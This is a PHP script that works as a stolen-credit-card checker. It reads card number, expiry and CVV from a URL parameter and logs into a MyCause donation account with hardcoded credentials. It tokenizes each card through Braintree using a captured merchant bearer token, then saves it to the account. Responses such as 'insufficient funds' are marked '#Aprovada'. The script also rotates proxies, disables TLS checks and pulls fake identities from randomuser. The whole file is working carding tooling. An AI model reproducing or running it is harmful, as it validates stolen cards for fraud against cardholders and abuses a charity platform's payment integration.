<?php

error_reporting(0);
date_default_timezone_set('America/New_York');

function multiexplode($delimiters, $string)
{
    $one = str_replace($delimiters, $delimiters[0], $string);
    $two = explode($delimiters[0], $one);
    return $two;
}

function rebootproxys()
{
    $proxySocks4 = file("proxy.txt");
    $myproxy = rand(0, sizeof($proxySocks4) - 1);
    $proxySocks = $proxySocks4[$myproxy];
    return $proxySocks;
}

$proxySocks4 = $_GET['proxy'];
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

function GetStr($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

if (file_exists(getcwd() . '/cookie.txt')) {
    @unlink('cookie.txt');
}

// Fetch a random U.S. user
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');

// Decode JSON
$data = json_decode($get, true);

// Extract user details safely
$first_name = $data['results'][0]['name']['first'] ?? null;
$last_name  = $data['results'][0]['name']['last'] ?? null;
$email      = $data['results'][0]['email'] ?? null;

// Replace domain if email exists
if ($email) {
    $updated_email = str_replace('@example.com', '@gmail.com', $email);

    // Print parsed user info
//     echo "<h3>Parsed Random User Details:</h3>";
//     echo "<pre>First Name : " . htmlspecialchars($first_name) . "</pre>";
//     echo "<pre>Last Name  : " . htmlspecialchars($last_name) . "</pre>";
//     echo "<pre>Original Email : " . htmlspecialchars($email) . "</pre>";
//     echo "<pre>Updated  Email : " . htmlspecialchars($updated_email) . "</pre>";
// } else {
//     echo "<h3 style='color:red;'>Failed to fetch user data from response.</h3>";
}


$ch = curl_init();
// ========================
// 1. MYCAUSE LOGIN REQUEST
// ========================
      // STEP 1: Request a new token
$loginUrl = 'https://api.mycause.com.au/account/login';
$loginBody = json_encode([
    'email'    => 'lakon78072@lovleo.com',
    'password' => '4BLrEU!UncfZb7C'
]);

$ch = curl_init($loginUrl);
curl_setopt_array($ch, [
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_POST => true,
  CURLOPT_POSTFIELDS => $loginBody,
  CURLOPT_HTTPHEADER => [
      'Content-Type: application/json',
      'Accept: application/json'
  ]
]);

// Execute login request
$resp = curl_exec($ch);
curl_close($ch);

// Store login response
$login_response = $resp;

// Decode JSON
$data = json_decode($login_response, true);

// Extract token
$token1 = $data['data']['token'] ?? null;

// Print the raw login response
///echo "<h3>Login Response:</h3>";
///echo "<pre>" . htmlspecialchars($login_response) . "</pre>";

// Print the extracted token
if ($token1) {
    ///echo "<h3>Extracted Token:</h3>";
    ///echo "<pre>" . htmlspecialchars($token1) . "</pre>";
} else {
    ///echo "<h3 style='color:red;'>Token not found in response.</h3>";
}

// =====================
// 2. BRAINTREE REQUEST
// =====================
$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_ENCODING, '');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POST, 1);

// Your dynamic card variables (ensure defined earlier)
// $cc  = '4038390050500282';
// $mes = '06';
// $ano = '2026';
// $cvv = '808';

$postData = [
    "clientSdkMetadata" => [
        "source" => "client",
        "integration" => "custom",
        "sessionId" => "d441a3e3-785b-4d58-a285-82a620aa60a3"
    ],
    "query" => "mutation TokenizeCreditCard(\$input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: \$input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }",
    "variables" => [
        "input" => [
            "creditCard" => [
                "number" => $cc,
                "expirationMonth" => $mes,
                "expirationYear" => $ano,
                "cvv" => $cvv
            ],
            "options" => ["validate" => false]
        ]
    ],
    "operationName" => "TokenizeCreditCard"
];

curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($postData));

$headers = [
  'accept: */*',
  'accept-encoding: gzip, deflate, br, zstd',
  'accept-language: en-GB,en-US;q=0.9,en;q=0.8',
  'authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3NjE4OTcwMTEsImp0aSI6IjE4MmY3Y2M3LTlhNDctNDU5NS04MjE0LWM1OTgyMDI4ZmJkYiIsInN1YiI6IjJ6OGZ0M3A0bTc2eXNtYjQiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjJ6OGZ0M3A0bTc2eXNtYjQiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZSwidmVyaWZ5X3dhbGxldF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0IiwiQnJhaW50cmVlOkNsaWVudFNESyJdLCJvcHRpb25zIjp7InBheXBhbF9jbGllbnRfaWQiOiJBZDNFbDFLc0RwSGV6eUdqZlpzZWg4YzZmOGJSamgzYVo3SlN0cTB0NFRZYmtCamtvOUk4RDhXNkxnVWItbHRSVGhkcXk0R3pMaDNBeTdJRCJ9fQ.lkekpTRuptovSkrr58KRbs4-dpWMVIiA3eBCu2BsPp-0Z5sEG0FCcO3g0PqSI3NJ2ZV48EMuukNeFqvkMzvk_A',
  'braintree-version: 2018-05-10',
  'content-type: application/json',
  'origin: https://assets.braintreegateway.com',
  'referer: https://assets.braintreegateway.com/',
  'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36'
];
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

// Cookies
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');

// Execute request
$response = curl_exec($ch);

if (curl_errno($ch)) {
    die('cURL Error: ' . curl_error($ch));
}

curl_close($ch);

// Decode response
$response_data = json_decode($response, true);

// Extract token and BIN
$token = $response_data['data']['tokenizeCreditCard']['token'] ?? null;
$bin   = $response_data['data']['tokenizeCreditCard']['creditCard']['bin'] ?? null;

///echo "<h3>Braintree Response:</h3>";
///echo "Token: " . htmlspecialchars($token) . "<br>";
///echo "BIN: " . htmlspecialchars($bin) . "<br>";

// Stop if token missing
if (!$token) {
    die("<strong>No token generated — stopping.</strong>");
}

// ========================
// 3. MYCAUSE API REQUEST
// ========================

$url = "https://api.mycause.com.au/my-account/credit-card";

$ch2 = curl_init();

$postFields = [
    'cardholderName' => 'veroniq',
    'paymentMethodNonce' => $token, // FIXED: single $
    'makeDefault' => false
];

curl_setopt($ch2, CURLOPT_URL, $url);
curl_setopt($ch2, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch2, CURLOPT_HEADER, 0);
curl_setopt($ch2, CURLOPT_POST, 1);
curl_setopt($ch2, CURLOPT_POSTFIELDS, http_build_query($postFields)); // Matches form encoding
curl_setopt($ch2, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch2, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch2, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
curl_setopt($ch2, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');

$headers2 = [
    'Authorization: Bearer ' . $token1,
    'Content-Type: application/x-www-form-urlencoded', // ✅ matches http_build_query
    'Origin: https://www.mycause.com.au',
    'Referer: https://www.mycause.com.au/',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36'
];
curl_setopt($ch2, CURLOPT_HTTPHEADER, $headers2);

// Execute and get response
$response2 = curl_exec($ch2);

if (curl_errno($ch2)) {
    die('cURL Error (MyCause): ' . curl_error($ch2));
}

curl_close($ch2);

// Output final response
///echo "<h3>MyCause Response:</h3>";
///echo "<pre>" . htmlspecialchars($response2) . "</pre>";




////////////////////////////===[Card Response]

// Convert response to lowercase for consistent matching
$raw = strtolower($response2);

// Default
$status = '#Reprovadas';
$badge  = 'badge-danger';
$desc   = 'Server Failure / Error Not Listed';

// Decode JSON response first
$data = json_decode($response2, true);

// If the API sent a message, show it
if (isset($data['error']['message']) && !empty($data['error']['message'])) {
    $desc = $data['error']['message'];
}

// ✅ Approvals
if (
    strpos($raw, '"success":true') !== false ||
    strpos($raw, 'insufficient funds') !== false ||
    strpos($raw, 'limit exceeded') !== false ||
    strpos($raw, 'card issuer declined cvv') !== false
) {
    $status = '#Aprovada';
    $badge  = 'badge-success';

    // Optional: overwrite with more readable labels
    if (strpos($raw, 'insufficient funds') !== false)       $desc = 'INSUFFICIENT FUNDS';
    elseif (strpos($raw, 'limit exceeded') !== false)        $desc = 'LIMIT EXCEEDED';
    elseif (strpos($raw, 'card issuer declined cvv') !== false) $desc = 'Card Issuer Declined CVV';
    elseif (strpos($raw, '"success":true') !== false)        $desc = 'Card Authorised';
}

// Output
echo "<font size=3 color='black'>
        <font class='$badge'>$status <i class='zmdi zmdi-check'></i></font>
        $cc|$mes|$ano|$cvv 
        <font size=3 color='black'>
          <font class='$badge'>$desc</font>
        </font><br>";

if (isset($ch) && is_resource($ch)) {
    curl_close($ch);
}
ob_flush();
///echo $response2;

?>
